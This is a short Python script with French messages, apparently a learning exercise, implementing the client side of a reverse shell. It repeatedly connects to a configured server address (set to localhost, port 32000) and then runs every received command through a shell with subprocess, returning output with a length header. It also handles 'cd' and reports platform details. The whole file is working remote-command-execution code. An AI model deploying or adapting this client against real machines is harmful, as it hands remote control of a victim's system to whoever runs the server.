import socket
import time
import subprocess
import platform

import os

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print("Command : ", command)
    # handles file path
    commande_split = command.split(" ")        
    if command == "infos":
        response = platform.platform() + " " + os.getcwd()
    # handles not directory    
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            # .strip("'") handles the case where you drag a folder into the shell on mac
            os.chdir(commande_split[1].strip("'"))
            response = " "
        except FileNotFoundError:
            response = "ERREUR : ce répertoire n'exite pas"
    else:
        response = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        response = response.stdout + response.stderr
        if not response or len(response) == 0:
            response = " "
           
    # handles too long command: 
    # HEADER 13 octets -> len data
    # DATA (len) octets 

    # ex : HEADER 0000000002024
    #      DATA (2024) octets
    data_len = len(response.encode())
    header = str(data_len).zfill(13)
    print(f'HEADER : {header}')
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(response.encode())


s.close()
